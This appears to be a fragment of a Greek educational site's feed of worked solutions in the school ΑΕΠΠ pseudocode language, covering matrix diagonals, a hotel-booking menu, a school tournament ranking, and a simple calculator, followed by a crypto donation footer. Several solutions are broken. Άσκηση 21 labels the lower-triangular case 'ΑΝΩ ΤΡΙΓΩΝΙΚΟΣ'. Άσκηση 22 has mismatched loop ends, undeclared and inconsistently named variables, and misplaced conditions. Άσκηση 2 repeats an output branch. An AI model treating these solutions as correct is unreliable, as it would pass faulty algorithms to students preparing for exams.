&lt;/code>&lt;/pre>&lt;p>&lt;img src=":/594a8b5fbecd4655bf23f436e429b309" alt="bf2367f8e165c1e64de82fab5a7f0ed1.png">
Δευτερεύουσα διαγώνιος!!!.
Οι γραμμές παρατηρούμε ότι τις εξερευνούμε σειριακά δηλαδή 1,2,3,4…..Ν , ενώ τις στήλες παρατηρούμε ότι ξεκινάμε από την τελευταία και σε κάθε επανάληψη, πάμε μία στήλη πιο μέσα.
Γι αυτό λοιπόν έχουμε Ν+1-Ζ από πάνω.
Ν διότι θέλουμε να ξεκινήσουμε από την τελευταία στήλη,
Το +1 το επιλέγουμε γιατί το Ζ ξεκινάει από το 1 , αρά Ν-Ζ = Ν-1, αρά δεν θα είχαμε πρόσβαση στην στήλη Ν.
Σε κάθε επανάληψη, όσο αυξάνεται το Ζ, πάμε όλο και στην πιο μέσα στήλη μέχρι να επισκεφτούμε όλη την δευτερεύουσα διαγώνιο.&lt;/p>
&lt;hr>
&lt;h2 id="άσκηση-21">Άσκηση 21:&lt;/h2>
&lt;pre tabindex="0">&lt;code>ΠΡΟΓΡΑΜΜΑ ΑΣΚ21
ΜΕΤΑΒΛΗΤΕΣ:
ΑΚΕΡΑΙΕΣ: Ι
ΠΡΑΓΜΑΤΙΚΕΣ: Α[Ν,Ν] ,ΣΥΝΟΛΟ ,
ΛΟΓΙΚΕΣ:ΑΝΩ,ΚΑΤΩ
ΑΡΧΗ
ΑΝΩ &amp;lt;- ΑΛΗΘΗΣ
ΓΙΑ Ι ΑΠΟ 1 ΜΕΧΡΙ Ν
ΓΙΑ Ζ ΑΠΟ 1 ΜΕΧΡΙ Ν
ΑΝ ( Α[Ι,Ζ]&amp;lt;&amp;gt;0 ΚΑΙ (Ι&amp;gt;Ζ) ) ΤΟΤΕ
ΑΝΩ &amp;lt;- ΨΕΥΔΗΣ
ΤΕΛΟΣ_ΑΝ
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
κατω &amp;lt;- ΑΛΗΘΗΣ
ΓΙΑ Ι ΑΠΟ 1 ΜΕΧΡΙ Ν
ΓΙΑ Ζ ΑΠΟ 1 ΜΕΧΡΙ Ν
ΑΝ ( Α[Ι,Ζ]&amp;lt;&amp;gt;0 ΚΑΙ (Ι&amp;lt;Ζ) ) ΤΟΤΕ
ΚΑΤΩ &amp;lt;- ΨΕΥΔΗΣ
ΤΕΛΟΣ_ΑΝ
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
ΑΝ (ΑΝΩ=ΑΛΗΘΗΣ ΚΑΙ ΚΑΤΩ=ΑΛΗΘΗΣ) ΤΟΤΕ
ΓΡΑΨΕ &amp;#34;ΔΙΑΓΩΝΙΟΣ&amp;#34;
ΑΛΛΙΩΣ_ΑΝ ΑΝΩ=ΑΛΗΘΗΣ ΤΟΤΕ
ΓΡΑΨΕ &amp;#34;ΑΝΩ ΤΡΙΓΩΝΙΚΟΣ&amp;#34;
ΑΛΛΙΩΣ_ΑΝ ΑΛΛΙΩΣ_ΑΝ ΚΑΤΩ=ΑΛΗΘΗΣ ΤΟΤΕ
ΓΡΑΨΕ &amp;#34;ΑΝΩ ΤΡΙΓΩΝΙΚΟΣ&amp;#34;
ΤΕΛΟΣ_ΠΡΟΓΡΑΜΜΑΤΟΣ
&lt;/code>&lt;/pre>&lt;hr>
&lt;h2 id="άσκηση-22">Άσκηση 22:&lt;/h2>
&lt;pre tabindex="0">&lt;code>ΠΡΟΓΡΑΜΜΑ ΑΣΚ22
ΜΕΤΑΒΛΗΤΕΣ:
ΑΚΕΡΑΙΕΣ: Ι ,Ζ ,ΑΠΑ1
ΠΡΑΓΜΑΤΙΚΕΣ:
ΧΑΡΑΚΤΗΡΕΣ: ΟΝΟΜΑ[60],ΚΟΣΤΟΣ[60][15] ,ΑΠ
ΛΟΓΙΚΕΣ:ΔΙΑΘΕΣΙΜΑ[60][15] ,ΕΒΡΕΘΗ
ΑΡΧΗ
ΓΙΑ Ι ΑΠΟ 1 ΜΕΧΡΙ 60
ΔΙΑΒΑΣΕ ΟΝΟΜΑ[Ι]
ΓΙΑ Ζ ΑΠΟ 1 ΜΕΧΡΙ 15
ΔΙΑΒΑΣΕ ΚΟΣΤΟΣ[Ι][Ζ]
ΓΡΑΨΕ &amp;#34;Είναι διαθέσιμο;&amp;#34;
ΑΡΧΗ_ΕΠΑΝΑΛΗΨΗΣ
ΔΙΑΒΑΣΕ ΑΠ
ΑΝ (ΑΠ=&amp;#34;ΝΑΙ&amp;#34;) ΤΟΤΕ
ΔΙΑΘΕΣΙΜΑ[Ι][Ζ]=ΑΛΗΘΗΣ
ΑΛΛΙΩΣ
ΔΙΑΘΕΣΙΜΑ[Ι][Ζ]=ΨΕΥΔΗΣ
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
ΜΕΧΡΙΣ_ΟΤΟΥ (ΑΠ=&amp;#34;ΝΑΙ&amp;#34; Ή ΑΠ=&amp;#34;ΟΧΙ&amp;#34;)
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
ΕΞΟΔΟΣ=10
ΑΡΧΗ_ΕΠΑΝΑΛΗΨΗΣ
ΓΡΑΨΕ &amp;#34;Πίεσε 0 για ενικοίαση δωματίου , 1 για άδειασμα δωματίου , 2 για έλεγχο διαθεσιμότητας , 3 για έξοδο&amp;#34;
ΔΙΑΒΑΣΕ ΑΠ1
ΑΝ ΑΠΑ1=0 ΤΟΤΕ
ΓΡΑΨΕ &amp;#34; Σε ποιό ξενοδοχείο θες να κάνεις κράτηση;&amp;#34;
ΔΙΑΒΑΣΕ ΑΠ
Ι=0
ΕΒΡΕΘΗ=ΨΕΥΔΗΣ
ΟΣΟ Ι&amp;lt;60 ΚΑΙ ΕΒΡΕΘΗ=ΨΕΥΔΗΣ ΕΠΑΝΕΛΑΒΕ
ΑΝ ΟΝΟΜΑ[Ι]!=ΑΠ
ΑΛΛΙΩΣ
ΕΒΡΕΘΗ=ΑΛΗΘΗΣ
ΤΕΛΟΣ_ΑΝ
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
ΑΝ ΕΒΡΕΘΗ=ΨΕΥΔΗΣ ΤΟΤΕ
ΓΡΑΨΕ &amp;#34; Δεν υπάρχει αυτό το ξενοδοχείο&amp;#34;
ΑΛΛΙΩΣ
Ζ=1
ΟΣΟ Ζ&amp;lt;15 ΕΠΑΝΕΛΑΒΕ
ΑΝ ΔΙΑΘΕΣΙΜΑ[Ι][Ζ]=ΑΛΗΘΗΣ ΤΟΤΕ
Ζ=Ζ+1 !Μέχρι να βρούμε άδειο δωμάτιο
ΑΝ Ζ=15 ΤΟΤΕ
ΓΡΑΨΕ &amp;#34;Δεν υπάρχει άδειο δωμάτιο&amp;#34;
ΤΕΛΟΣ_ΑΝ
ΑΛΛΙΩΣ
ΔΙΑΘΕΣΙΜΑ[Ι][Ζ]=ΑΛΗΘΗΣ
Ζ=16 !Ώστε να βγει από την όσο
ΔΙΑΒΑΣΕ ΟΝΟΜΑ[Ι][Ζ],ΗΛΙΚΙΑ[Ι][Ζ],ΑΤΟΜΑ[Ι][Ζ]
ΑΝ ΑΤΟΜΑ[Ι][Ζ]&amp;gt;3 ΤΟΤΕ
ΑΝ ( ΗΛΙΚΙΑ[Ι][Ζ]&amp;lt;=18 ΚΑΙ ΗΛΙΚΙΑ[Ι][Ζ]&amp;lt;=23 ) ΤΟΤΕ
ΚΟΣΤΟΣ[Ι][Ζ]=ΤΙΜΗ[Ι] - 5*ΤΙΜΗ[Ι]/100
ΤΕΛΟΣ_ΑΝ
ΜΕΧΡΙΣ_ΟΤΟΥ ΕΞΟΔΟΣ=1
ΚΟΣΤΟΣ[Ι][Ζ]=ΤΙΜΗ[Ι] + 15*ΤΙΜΗ[Ι]/100
ΤΕΛΟΣ_ΑΝ
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
ΤΕΛΟΣ_ΑΝ
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
ΑΛΛΙΩΣ_ΑΝ ΑΠΑ1=1 ΤΟΤΕ
ΓΡΑΨΕ &amp;#34; Σε ποιό ξενοδοχείο θες να ακυρωθεί η κράτηση;&amp;#34;
ΔΙΑΒΑΣΕ ΑΠ
Ι=0
ΕΒΡΕΘΗ=ΨΕΥΔΗΣ
ΟΣΟ Ι&amp;lt;60 ΚΑΙ ΕΒΡΕΘΗ=ΨΕΥΔΗΣ ΕΠΑΝΕΛΑΒΕ
ΑΝ ΟΝΟΜΑ[Ι]!=ΑΠ
ΑΛΛΙΩΣ
ΕΒΡΕΘΗ=ΑΛΗΘΗΣ
ΤΕΛΟΣ_ΑΝ
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
ΑΝ ΕΒΡΕΘΗ=ΨΕΥΔΗΣ ΤΟΤΕ
ΓΡΑΨΕ &amp;#34; Δεν υπάρχει αυτό το ξενοδοχείο&amp;#34;
ΑΛΛΙΩΣ
ΓΡΑΨΕ &amp;#34;Δώσε αριθμό δωματίου που θέλεις να γίνει ακύρωση &amp;#34;
ΑΡΧΗ_ΕΠΑΝΑΛΗΨΗΣ
ΔΙΑΒΑΣΕ ΑΡ1
ΜΕΧΡΙΣ_ΟΤΟΥ (ΑΡ&amp;lt;=15)
ΑΝ ΔΙΑΘΕΣΙΜΑ[Ι][ΑΡ2]=ΨΕΥΔΗΣ ΤΟΤΕ
ΔΙΑΘΕΣΙΜΑ[Ι][ΑΡ2]=ΑΛΗΘΗΣ
ΟΝΟΜΑ[Ι][Ζ]=&amp;#34;&amp;#34; ! Κενό
ΗΛΙΚΙΑ[Ι][Ζ]= -1
ΚΟΣΤΟΣ[Ι][Ζ]= -1
ΑΛΛΙΩΣ
ΓΡΑΨΕ &amp;#34;Αυτό το δωμάτιο είναι ήδη διαθέσιμο¨
ΤΕΛΟΣ_ΑΝ
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
ΑΛΛΙΩΣ_ΑΝ ΑΠΑ1=2
ΔΙΑΒΑΣΕ ΑΠ
Ι=0
ΕΒΡΕΘΗ=ΨΕΥΔΗΣ
ΟΣΟ Ι&amp;lt;60 ΚΑΙ ΕΒΡΕΘΗ=ΨΕΥΔΗΣ ΕΠΑΝΕΛΑΒΕ
ΑΝ ΟΝΟΜΑ[Ι]!=ΑΠ
ΑΛΛΙΩΣ
ΕΒΡΕΘΗ=ΑΛΗΘΗΣ
ΤΕΛΟΣ_ΑΝ
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
ΑΝ ΕΒΡΕΘΗ=ΨΕΥΔΗΣ ΤΟΤΕ
ΓΡΑΨΕ &amp;#34; Δεν υπάρχει αυτό το ξενοδοχείο&amp;#34;
ΑΛΛΙΩΣ
ΓΡΑΨΕ &amp;#34;Δώσε αριθμό δωματίου που θέλεις να ελέγξεις &amp;#34;
ΑΡΧΗ_ΕΠΑΝΑΛΗΨΗΣ
ΔΙΑΒΑΣΕ ΑΡ1
ΜΕΧΡΙΣ_ΟΤΟΥ (ΑΡ&amp;lt;=15)
ΑΝ ΔΙΑΘΕΣΙΜΑ[Ι][ΑΡ2]=ΨΕΥΔΗΣ ΤΟΤΕ
ΓΡΑΨΕ &amp;#34; Είναι κλεισμένο&amp;#34;
ΑΛΛΙΩΣ
ΓΡΑΨΕ &amp;#34;Διαθέσιμο¨
ΤΕΛΟΣ_ΑΝ
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
ΑΝ ΑΠΑ1=3 ΤΟΤΕ
ΕΞΟΔΟΣ=1
ΤΕΛΟΣ_ΑΝ
ΠΡΟΓΡΑΜΜΑ ΑΣΚ23
ΜΕΤΑΒΛΗΤΕΣ
ΑΚΕΡΑΙΕΣ:Ι,J,Α[5,3],ΤΕΜP,K,ΣΧ_1,ΣΧ_2,ΣΕΤ_1,ΣΕΤ_2
ΧΑΡΑΚΤΗΡΕΣ:ΟΝ[5],TEMP2
ΑΡΧΗ
ΓΙΑ I ΑΠΟ 1 ΜΕΧΡΙ 5
ΓΡΑΨΕ ’Δώσε το όνομα του σχολείου’
ΔΙΑΒΑΣΕ ΟΝ [Ι]
ΓΙΑ J ΑΠΟ 1 ΜΕΧΡΙ 3
Α[Ι,J]&amp;lt;--0
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
ΓΙΑ Ι ΑΠΟ 1 ΜΕΧΡΙ 10
ΓΡΑΨΕ ’Δώσε τα αποτελέσματα κάθε αγώνα’
ΔΙΑΒΑΣΕ ΣΧ_1, ΣΧ_2, ΣΕΤ_1,ΣΕΤ_2
Α[ΣΧ_1,2]&amp;lt;--Α[ΣΧ_1,2]+ΣΕΤ_1
Α[ΣΧ_1,3]&amp;lt;--Α[ΣΧ_1,3]+ΣΕΤ_2
Α[ΣΧ_2,2]&amp;lt;--Α[ΣΧ_2,2]+ΣΕΤ_2
Α[ΣΧ_2,3]&amp;lt;--Α[ΣΧ_2,3]+ΣΕΤ_1
ΑΝ ΣΕΤ_1&amp;gt;ΣΕΤ_2 ΤΟΤΕ
Α[ΣΧ_1,1]&amp;lt;--Α[ΣΧ_1,1]+2
Α[ΣΧ_2,1]&amp;lt;--Α[ΣΧ_2,1]+1
ΑΛΛΙΩΣ
Α[ΣΧ_1,1]&amp;lt;--Α[ΣΧ_1,1]+1
Α[ΣΧ_2,1]&amp;lt;--Α[ΣΧ_2,1]+2
ΤΕΛΟΣ_ΑΝ
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
ΓΙΑ Ι ΑΠΟ 2 ΜΕΧΡΙ 5
ΓΙΑ J ΑΠΟ 5 ΜΕΧΡΙ Ι ΜΕ_ΒΗΜΑ -1
ΑΝ Α[J,1]&amp;gt;A[J-1,1] ΤΟΤΕ
ΓΙΑ Κ ΑΠΟ 1 ΜΕΧΡΙ 3
TEMP&amp;lt;-- A[J,K]
A[J,K]&amp;lt;--A[J-1,K]
A[J-1,K]&amp;lt;--TEMP
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
TEMP2&amp;lt;--ON[J]
ON[J]&amp;lt;-- ON[J-1]
ON[J-1]&amp;lt;--TEMP2
ΑΛΛΙΩΣ_ΑΝ Α[J,1]=A[J-1,1] ΤΟΤΕ
ΑΝ Α[J,2]&amp;gt;A[J-1,2] ΤΟΤΕ
ΓΙΑ Κ ΑΠΟ 1 ΜΕΧΡΙ 3
TEMP&amp;lt;-- A[J,K]
A[J,K]&amp;lt;--A[J-1,K]
A[J-1,K]&amp;lt;--TEMP
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
TEMP2&amp;lt;--ON[J]
ON[J]&amp;lt;-- ON[J-1]
ON[J-1]&amp;lt;--TEMP2
ΤΕΛΟΣ_ΑΝ
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
ΓΙΑ Ι ΑΠΟ 1 ΜΕΧΡΙ 5
ΓΡΑΨΕ ΟΝ[Ι],Α[Ι,1],Α[Ι,2],Α[Ι,3]
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
ΤΕΛΟΣ_ΠΡΟΓΡΑΜΜΑΤΟΣ
&lt;/code>&lt;/pre>&lt;hr>
&lt;h2 id="υποστηρίξτε-το-project-για-να-συνεχίσουμε-να-παράγουμε-εκπαιδευτικό-υλικό">Υποστηρίξτε το Project για να συνεχίσουμε να παράγουμε εκπαιδευτικό υλικό.&lt;/h2>
&lt;p>Προσοχή: Από τις 28 Δεκεμβρίου το Project Panellinies_AEPP απενεργοποιεί όλες τις διαφημίσεις πάνω στο εκπαιδευτικό υλικό.
Τo Project πλέον λειτουργεί και υποστηρίζεται αποκλειστικά από τις χορηγίες σας σε Basic Attention Token (BAT) μέσω του Brave Browser &lt;a href="https://www.youtube.com/LinuxOSblog/">στο κανάλι στο Youtube&lt;/a> καθώς και σε άλλα κρυπτονομίσματα στις παρακάτω διευθύνσεις:&lt;/p>
&lt;p>Bitcoin: bc1q6j959m3whh44ztr8k6p7545n5pzcsncple7qmy&lt;/p>
&lt;p>Ethereum: 0x3f27F05Ca28a5B5F876A3A7d435E2E852756F873&lt;/p>
&lt;p>Cardano: addr1qxewtm0y5yk2mgf93ct4ghguus2shu34fu786t62j3tv7296evenhmr0ltmx3hdyw4d6d8gj8qspry5pe3raaw4nu8as7jsr9l&lt;/p>
&lt;p>Monero: 46ewn3rgXMSceuEUEng1bze1RzG61rEiFV3hJ6VKuzvHU62jPntydJRBcFinQ62Pad8AvdoX9YbQcY5HKX3Cr3UQPkhiQ4L&lt;/p>
&lt;p>VeChain:0x3f27F05Ca28a5B5F876A3A7d435E2E852756F873&lt;/p>
&lt;p>Shiba:0x3f27F05Ca28a5B5F876A3A7d435E2E852756F873&lt;/p>
&lt;p>AIOZ:0x3f27F05Ca28a5B5F876A3A7d435E2E852756F873&lt;/p>
&lt;p>Για το πώς θα κερδίσετε δωρεάν BAT, διαβάστε αυτό το άρθρο κάνοντας κλικ &lt;a href="https://cerebrux.net/2021/02/25/brave-bat-token/">εδώ&lt;/a>&lt;/p>
&lt;p>&lt;img src="/img/brave.png" alt="">&lt;/p></content></item><item><title>Θέματα Γ+Δ Part1</title><link>/lyseis_aepp/content/posts/ask_g+d_1/</link><pubDate>Sun, 27 Feb 2022 00:00:00 +0000</pubDate><guid>/lyseis_aepp/content/posts/ask_g+d_1/</guid><description>Θέματα Γ+Δ : Part 1: Άσκηση 1: ΠΡΟΓΡΑΜΜΑ ΑΣΚ01 ΜΕΤΑΒΛΗΤΕΣ: α , β ,απ ΑΡΧΗ_ΠΡΟΓΡΑΜΜΑΤΟΣ ΔΙΑΒΑΣΕ α , β ΑΡΧΗ_ΕΠΑΝΑΛΗΨΗΣ ΓΡΑΨΕ &amp;#34; Δώσε 1 για πρόσθεση , 2 για αφαίρεση , 3 για πολλαπλασιασμό , 4 για διαίρεση ΔΙΑΒΑΣΕ απ ΜΕΧΡΙΣ_ΟΤΟΥ (απ=1) Η (απ=2) Η (απ=3) Η (απ=4) ΑΝ απ =1 ΤΟΤΕ ΓΡΑΨΕ α+β ΑΛΛΙΩΣ_ΑΝ απ=2 ΤΟΤΕ ΓΡΑΨΕ α-β ΑΛΛΙΩΣ ΑΝ απ=3 ΤΟΤΕ ΓΡΑΨΕ α*β ΑΛΛΙΩΣ ΑΝ β!=0 ΤΟΤΕ ΓΡΑΨΕ α/β ΑΛΛΙΩΣ ΓΡΑΨΕ &amp;#34; Μη επιτρεπτή πράξη &amp;#34; ΤΕΛΟΣ_ΑΝ ΤΕΛΟΣ_ΑΝ ΤΕΛΟΣ_ΠΡΟΓΡΑΜΜΑΤΟΣ Άσκηση 2: ΠΡΟΓΡΑΜΜΑ ΑΣΚ02 ΜΕΤΑΒΛΗΤΕΣ: ΧΑΡΑΚΤΗΡΕΣ: παιδια , παιδιβ ,παιδιγ ΑΚΕΡΑΙΟΙ: scorea , scoreb ,scoreg ΑΡΧΗ_ΠΡΟΓΡΑΜΜΑΤΟΣ ΓΡΑΨΕ &amp;#34; ΔΩΣΕ ΤΟ ΟΝΟΜΑ ΤΟΥ ΠΡΩΤΟΥ ΠΑΙΔΙΟΥ&amp;#34; ΔΙΑΒΑΣΕ παιδια ΓΡΑΨΕ &amp;#34; ΔΩΣΕ ΤΟ ΣΚΟΡ ΤΟΥ ΠΡΩΤΟΥ ΠΑΙΔΙΟΥ &amp;#34; ΔΙΑΒΑΣΕ scorea ΓΡΑΨΕ &amp;#34; ΔΩΣΕ ΤΟ ΟΝΟΜΑ ΤΟΥ ΔΕΥΤΕΡΟΥ ΠΑΙΔΙΟΥ&amp;#34; ΔΙΑΒΑΣΕ παιδιβ ΓΡΑΨΕ &amp;#34; ΔΩΣΕ ΤΟ ΣΚΟΡ ΤΟΥ ΔΕΥΤΕΡΟΥ ΠΑΙΔΙΟΥ &amp;#34; ΔΙΑΒΑΣΕ scoreb ΓΡΑΨΕ &amp;#34; ΔΩΣΕ ΤΟ ΟΝΟΜΑ ΤΟΥ ΤΡΙΤΟΥ ΠΑΙΔΙΟΥ&amp;#34; ΔΙΑΒΑΣΕ παιδιγ ΓΡΑΨΕ &amp;#34; ΔΩΣΕ ΤΟ ΣΚΟΡ ΤΟΥ ΤΡΙΤΟΥ ΠΑΙΔΙΟΥ &amp;#34; ΔΙΑΒΑΣΕ scoreg AN ( scorea &amp;gt; scoreb ) ΚΑΙ ( scorea &amp;gt; scoreg) TOTE ΑΝ scoreb &amp;gt; scoreg ΤΟΤΕ ΓΡΑΨΕ παιδια,παιδιβ,παιδιγ ΑΛΛΙΩΣ ΓΡΑΨΕ παιδια,παιδιγ,παιδιβ ΤΕΛΟΣ_ΑΝ ΑΛΛΙΩΣ_ΑΝ ( scorea &amp;lt; scoreb ) ΚΑΙ ( scoreb &amp;gt; scoreg) TOTE ΑΝ scorea &amp;gt; scoreg ΤΟΤΕ ΓΡΑΨΕ παιδιβ,παιδια,παιδιγ ΑΛΛΙΩΣ ΓΡΑΨΕ παιδιβ,παιδια,παιδιγ ΤΕΛΟΣ_ΑΝ ΑΛΛΙΩΣ ΑΝ scoreb &amp;gt; scoreg ΤΟΤΕ ΓΡΑΨΕ παιδιγ,παιδιβ,παιδια ΑΛΛΙΩΣ ΓΡΑΨΕ παιδιγ,παιδια,παιδιβ ΤΕΛΟΣ_ΑΝ ΤΕΛΟΣ_ΑΝ ΤΕΛΟΣ_ΠΡΟΓΡΑΜΜΑΤΟΣ Άσκηση 3: ΠΡΟΓΡΑΜΜΑ ΑΣΚ03 ΜΕΤΑΒΛΗΤΕΣ: ΧΑΡΑΚΤΗΡΕΣ: απαντηση ΑΚΕΡΑΙΟΙ: ναι ,οχι ΑΡΧΗ_ΠΡΟΓΡΑΜΜΑΤΟΣ ναι=0 οχι=0 ΑΡΧΗ_ΕΠΑΝΑΛΗΨΗΣΗΣ ΔΙΑΒΑΣΕ απαντηση ΑΝ απαντηση= &amp;#34;ΝΑΙ&amp;#34; ΤΟΤΕ ΓΡΑΨΕ &amp;#34;ΟΧΙ&amp;#34; ναι= ναι + 1 ΑΛΛΙΩΣ_ΑΝ απαντηση= &amp;#34;ΟΧΙ&amp;#34; ΤΟΤΕ ΓΡΑΨΕ &amp;#34;ΝΑΙ&amp;#34; οχι = οχι + 1 ΤΕΛΟΣ_ΑΝ ΜΕΧΡΙΣ_ΟΤΟΥ (απαντηση !</description><content>&lt;h1 id="θέματα-γδ--part-1">Θέματα Γ+Δ : Part 1:&lt;/h1>
&lt;h2 id="άσκηση-1">Άσκηση 1:&lt;/h2>
&lt;pre tabindex="0">&lt;code>ΠΡΟΓΡΑΜΜΑ ΑΣΚ01
ΜΕΤΑΒΛΗΤΕΣ: α , β ,απ
ΑΡΧΗ_ΠΡΟΓΡΑΜΜΑΤΟΣ
ΔΙΑΒΑΣΕ α , β
ΑΡΧΗ_ΕΠΑΝΑΛΗΨΗΣ
ΓΡΑΨΕ &amp;#34; Δώσε 1 για πρόσθεση , 2 για αφαίρεση , 3 για πολλαπλασιασμό , 4 για διαίρεση
ΔΙΑΒΑΣΕ απ
ΜΕΧΡΙΣ_ΟΤΟΥ (απ=1) Η (απ=2) Η (απ=3) Η (απ=4)
ΑΝ απ =1 ΤΟΤΕ
ΓΡΑΨΕ α+β
ΑΛΛΙΩΣ_ΑΝ απ=2 ΤΟΤΕ
ΓΡΑΨΕ α-β
ΑΛΛΙΩΣ ΑΝ απ=3 ΤΟΤΕ
ΓΡΑΨΕ α*β
ΑΛΛΙΩΣ
ΑΝ β!=0 ΤΟΤΕ
ΓΡΑΨΕ α/β
ΑΛΛΙΩΣ
ΓΡΑΨΕ &amp;#34; Μη επιτρεπτή πράξη &amp;#34;
ΤΕΛΟΣ_ΑΝ
ΤΕΛΟΣ_ΑΝ
ΤΕΛΟΣ_ΠΡΟΓΡΑΜΜΑΤΟΣ
&lt;/code>&lt;/pre>&lt;hr>
&lt;h2 id="άσκηση-2">Άσκηση 2:&lt;/h2>
&lt;pre tabindex="0">&lt;code>ΠΡΟΓΡΑΜΜΑ ΑΣΚ02
ΜΕΤΑΒΛΗΤΕΣ:
ΧΑΡΑΚΤΗΡΕΣ: παιδια , παιδιβ ,παιδιγ
ΑΚΕΡΑΙΟΙ: scorea , scoreb ,scoreg
ΑΡΧΗ_ΠΡΟΓΡΑΜΜΑΤΟΣ
ΓΡΑΨΕ &amp;#34; ΔΩΣΕ ΤΟ ΟΝΟΜΑ ΤΟΥ ΠΡΩΤΟΥ ΠΑΙΔΙΟΥ&amp;#34;
ΔΙΑΒΑΣΕ παιδια
ΓΡΑΨΕ &amp;#34; ΔΩΣΕ ΤΟ ΣΚΟΡ ΤΟΥ ΠΡΩΤΟΥ ΠΑΙΔΙΟΥ &amp;#34;
ΔΙΑΒΑΣΕ scorea
ΓΡΑΨΕ &amp;#34; ΔΩΣΕ ΤΟ ΟΝΟΜΑ ΤΟΥ ΔΕΥΤΕΡΟΥ ΠΑΙΔΙΟΥ&amp;#34;
ΔΙΑΒΑΣΕ παιδιβ
ΓΡΑΨΕ &amp;#34; ΔΩΣΕ ΤΟ ΣΚΟΡ ΤΟΥ ΔΕΥΤΕΡΟΥ ΠΑΙΔΙΟΥ &amp;#34;
ΔΙΑΒΑΣΕ scoreb
ΓΡΑΨΕ &amp;#34; ΔΩΣΕ ΤΟ ΟΝΟΜΑ ΤΟΥ ΤΡΙΤΟΥ ΠΑΙΔΙΟΥ&amp;#34;
ΔΙΑΒΑΣΕ παιδιγ
ΓΡΑΨΕ &amp;#34; ΔΩΣΕ ΤΟ ΣΚΟΡ ΤΟΥ ΤΡΙΤΟΥ ΠΑΙΔΙΟΥ &amp;#34;
ΔΙΑΒΑΣΕ scoreg
AN ( scorea &amp;gt; scoreb ) ΚΑΙ ( scorea &amp;gt; scoreg) TOTE
ΑΝ scoreb &amp;gt; scoreg ΤΟΤΕ
ΓΡΑΨΕ παιδια,παιδιβ,παιδιγ
ΑΛΛΙΩΣ
ΓΡΑΨΕ παιδια,παιδιγ,παιδιβ
ΤΕΛΟΣ_ΑΝ
ΑΛΛΙΩΣ_ΑΝ ( scorea &amp;lt; scoreb ) ΚΑΙ ( scoreb &amp;gt; scoreg) TOTE
ΑΝ scorea &amp;gt; scoreg ΤΟΤΕ
ΓΡΑΨΕ παιδιβ,παιδια,παιδιγ
ΑΛΛΙΩΣ
ΓΡΑΨΕ παιδιβ,παιδια,παιδιγ
ΤΕΛΟΣ_ΑΝ
ΑΛΛΙΩΣ
ΑΝ scoreb &amp;gt; scoreg ΤΟΤΕ
ΓΡΑΨΕ παιδιγ,παιδιβ,παιδια
ΑΛΛΙΩΣ
ΓΡΑΨΕ παιδιγ,παιδια,παιδιβ
ΤΕΛΟΣ_ΑΝ
ΤΕΛΟΣ_ΑΝ
ΤΕΛΟΣ_ΠΡΟΓΡΑΜΜΑΤΟΣ
&lt;/code>&lt;/pre>&lt;hr>
&lt;h2 id="άσκηση-3">Άσκηση 3:&lt;/h2>
&lt;pre tabindex="0">&lt;code>ΠΡΟΓΡΑΜΜΑ ΑΣΚ03
ΜΕΤΑΒΛΗΤΕΣ:
ΧΑΡΑΚΤΗΡΕΣ: απαντηση
ΑΚΕΡΑΙΟΙ: ναι ,οχι
ΑΡΧΗ_ΠΡΟΓΡΑΜΜΑΤΟΣ
ναι=0
οχι=0
ΑΡΧΗ_ΕΠΑΝΑΛΗΨΗΣΗΣ
ΔΙΑΒΑΣΕ απαντηση
ΑΝ απαντηση= &amp;#34;ΝΑΙ&amp;#34; ΤΟΤΕ
ΓΡΑΨΕ &amp;#34;ΟΧΙ&amp;#34;
ναι= ναι + 1
ΑΛΛΙΩΣ_ΑΝ απαντηση= &amp;#34;ΟΧΙ&amp;#34; ΤΟΤΕ
ΓΡΑΨΕ &amp;#34;ΝΑΙ&amp;#34;
οχι = οχι + 1
ΤΕΛΟΣ_ΑΝ
ΜΕΧΡΙΣ_ΟΤΟΥ (απαντηση != &amp;#34;ΝΑΙ&amp;#34; ) ΚΑΙ (απαντηση != &amp;#34;ΟΧΙ&amp;#34;)
ΓΡΑΨΕ &amp;#34;Πλήθος των ναι : &amp;#34;, ναι
ΓΡΑΨΕ &amp;#34;Πλήθος των όχι : &amp;#34; , οχι
ΤΕΛΟΣ_ΠΡΟΓΡΑΜΜΑΤΟΣ
&lt;/code>&lt;/pre>&lt;hr>
&lt;h2 id="άσκηση-4">Άσκηση 4:&lt;/h2>
&lt;pre tabindex="0">&lt;code>ΠΡΟΓΡΑΜΜΑ ΑΣΚ04
ΜΕΤΑΒΛΗΤΕΣ:
ΠΡΑΓΜΑΤΙΚΕΣ: ΑΡΙΘΜΟΣ
ΑΡΧΗ
ΑΡΧΗ_ΕΠΑΝΑΛΗΨΗΣ
ΔΙΑΒΑΣΕ ΑΡΙΘΜΟΣ
ΜΕΧΡΙΣ_ΟΤΟΥ (ΑΡΙΘΜΟΣ&amp;gt;=100 ΚΑΙ ΑΡΙΘΜΟΣ&amp;lt;=999)
ΑΡΙΘΜΟΣ&amp;lt;- ΑΡΙΘΜΟΣ+50
ΑΡΙΘΜΟΣ&amp;lt;- ΑΡΙΘΜΟΣDIV100
AΡΙΘΜΟΣ&amp;lt;-ΑΡΙΘΜΟΣ*100
ΓΡΑΨΕ ΑΡΙΘΜΟΣ
